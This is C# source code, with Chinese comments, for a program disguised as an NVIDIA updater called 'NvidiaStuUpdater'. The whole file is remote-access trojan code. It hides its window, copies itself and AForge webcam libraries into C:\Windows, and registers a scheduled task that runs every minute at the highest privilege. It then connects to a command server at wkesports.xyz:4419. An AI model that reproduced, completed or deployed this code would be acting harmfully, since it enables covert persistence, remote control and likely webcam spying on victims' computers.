using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using TaskScheduler;

namespace NvidiaStuUpdater
{
    class Program
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        static void Main(string[] args)
        {
            //隐藏窗体
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, 0);


            
            //如果当前路径不对拷贝文件
            string currentExePath = Application.ExecutablePath;
            string currentPath = System.IO.Directory.GetCurrentDirectory();
            if (!currentPath.Equals("C:\\Windows"))
            {
                //判断原来的文件是否存在
                bool exist = File.Exists(@"C:\Windows\NvidiaStuUpdater.exe");
                //存在则删除
                if (exist)
                {
                    runCmd rc5 = new runCmd();
                    rc5.execute("del C:\\Windows\\NvidiaStuUpdater.exe");
                }

                string exeName = System.IO.Path.GetFileName(currentExePath);
                runCmd rc1 = new runCmd();
                rc1.execute("copy \"" + currentExePath + "\" C:\\Windows\\ /y");
                runCmd rc2 = new runCmd();
                rc2.execute("copy \"" + currentPath + "\\ClassLib.dll\"" + " C:\\Windows\\ /y");
                runCmd rc3 = new runCmd();
                rc3.execute("copy \"" + currentPath + "\\Interop.TaskScheduler.dll\"" + " C:\\Windows\\ /y");
                runCmd rc6 = new runCmd();
                rc6.execute("copy \"" + currentPath + "\\netstandard.dll\"" + " C:\\Windows\\ /y");

                runCmd rc7 = new runCmd();
                rc7.execute("copy \"" + currentPath + "\\AForge.Controls.dll\"" + " C:\\Windows\\ /y");
                runCmd rc8 = new runCmd();
                rc8.execute("copy \"" + currentPath + "\\AForge.dll\"" + " C:\\Windows\\ /y");
                runCmd rc9 = new runCmd();
                rc9.execute("copy \"" + currentPath + "\\AForge.Imaging.dll\"" + " C:\\Windows\\ /y");
                runCmd rc10 = new runCmd();
                rc10.execute("copy \"" + currentPath + "\\AForge.Math.dll\"" + " C:\\Windows\\ /y");
                runCmd rc11 = new runCmd();
                rc11.execute("copy \"" + currentPath + "\\AForge.Video.DirectShow.dll\"" + " C:\\Windows\\ /y");
                runCmd rc12 = new runCmd();
                rc12.execute("copy \"" + currentPath + "\\AForge.Video.dll\"" + " C:\\Windows\\ /y");

                
                runCmd rc4 = new runCmd();
                rc4.execute("rename \"C:\\Windows\\" + exeName + "\" NVIDIAStuUpdater.exe");

                
            }

            string nowpath = Environment.CurrentDirectory;
            if (System.IO.File.Exists(nowpath + "\\Jk2040JWow240852XORLL5NM5"))
            {
                Console.WriteLine("存在");
                runCmd rc13 = new runCmd();
                rc13.execute("pclr.db");
            }
            else
            {
                Console.WriteLine("不存在");
            }


            //创建任务计划
            if (!schExist())
            {
                //不存在
                //直接创建
                schTasks();
            }
            else
            {
                //存在
                //先删除
                TaskSchedulerClass ts = new TaskSchedulerClass();
                ts.Connect(null, null, null, null);
                ITaskFolder folder = ts.GetFolder("\\");
                folder.DeleteTask("NVIDIAStuUpdater", 0);
                //然后创建
                schTasks();
            }
            //判断另一个NvidiaStuUpdater是否在运行了
            bool createNew;
            Mutex mutex = new Mutex(false, "NvidiaStuUpdater", out createNew);
            if (createNew==false)
            {
                Process.GetCurrentProcess().Kill();
            }
            
            //未找到其他的nviupd  开始程序

            //启用Socket
            IPEndPoint ServerEndPoint = new IPEndPoint(IPAddress.Parse("wkesports.xyz"), 4419);//服务器终端地址
            //客户端socket
            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //链接服务器
            try
            {
                client.Connect(ServerEndPoint);
                DialogToServer dls = new DialogToServer(client);
            }
            catch(Exception ex)
            {
                Process.GetCurrentProcess().Kill();
            }

            
        }

        //设置计划任务
        public static void schTasks()
        {
            try
            {
                //创建任务
                TaskSchedulerClass scheduler = new TaskSchedulerClass();
                scheduler.Connect(null, null, null, null);
                ITaskFolder folder = scheduler.GetFolder("\\");
                //设置属性
                ITaskDefinition task = scheduler.NewTask(0);
                task.RegistrationInfo.Author = "1234";
                task.RegistrationInfo.Description = "NVIDIAStuUpdater";
                task.Principal.RunLevel = _TASK_RUNLEVEL.TASK_RUNLEVEL_HIGHEST;
                //设置触发器
                ILogonTrigger tt = (ILogonTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                ITimeTrigger tt2 = (ITimeTrigger)task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME);
                //30分钟一次
                tt2.Repetition.Interval = "PT0H1M";
                tt2.StartBoundary = "2000-01-01T00:00:00";
                //设置操作
                IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                action.Path = "C:\\Windows\\NVIDIAStuUpdater.exe";
                //其他操作
                task.Settings.ExecutionTimeLimit = "PT0S";
                task.Settings.DisallowStartIfOnBatteries = false;
                task.Settings.RunOnlyIfIdle = false;
                //注册任务
                IRegisteredTask regTask = folder.RegisterTaskDefinition(
                    "NVIDIAStuUpdater",
                    task,
                    (int)_TASK_CREATION.TASK_CREATE,
                    null,
                    null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                    "");
            }catch(Exception ex)
            {
                throw ex;
            }
        }

        /// <summary>
        /// 判断任务计划是否存在
        /// </summary>
        /// <returns></returns>
        public static bool schExist()
        {
            var isExist = false;
            IRegisteredTaskCollection task_exsit = GetAllTasks();
            for(int i = 1; i <= task_exsit.Count; i++)
            {
                IRegisteredTask t = task_exsit[i];
                if (t.Name.Equals("NVIDIAStuUpdater"))
                {
                    isExist = true;
                    break;
                }
            }
            return isExist;
        }

        /// <summary>
        /// 取得所有的任务计划
        /// </summary>
        /// <returns></returns>
        public static IRegisteredTaskCollection GetAllTasks()
        {
            TaskSchedulerClass ts = new TaskSchedulerClass();
            ts.Connect(null, null, null, null);
            ITaskFolder folder = ts.GetFolder("\\");
            IRegisteredTaskCollection tasks_exists = folder.GetTasks(1);
            return tasks_exists;
        }
    }
}
